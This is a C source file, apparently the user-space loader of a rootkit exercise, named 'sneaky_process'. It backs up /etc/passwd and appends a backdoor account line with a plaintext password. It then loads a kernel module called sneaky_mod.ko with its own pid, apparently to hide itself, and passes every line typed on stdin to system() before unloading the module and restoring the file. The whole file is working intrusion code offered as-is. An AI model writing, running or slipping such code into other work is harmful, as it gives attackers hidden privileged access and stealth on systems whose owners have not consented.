#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h> // for strcmp()

void execv_line() {
  char* line = NULL;
  size_t size;
  int ctn = 1;
  while (ctn) {
    getline(&line, &size, stdin);
    if (strcmp(line, "q\n") == 0) {
      ctn = 0;
    } else {
      system(line);
    }
  }
}

int main() {
  char load_mod[50];

  printf("sneaky_process pid = %d\n", getpid());  // print pid

  system("cp /etc/passwd /tmp");    // backup password

  // insert new password
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");   

  // load mod, with the current process id as parameter
  sprintf(load_mod, "insmod sneaky_mod.ko pid_str=%d", getpid());
  system(load_mod);

  execv_line(); // execute terminal commands
  
  system("sudo rmmod sneaky_mod");     // un-load mod

  system("cp /tmp/passwd /etc");   // password recover
  
  return EXIT_SUCCESS;
}
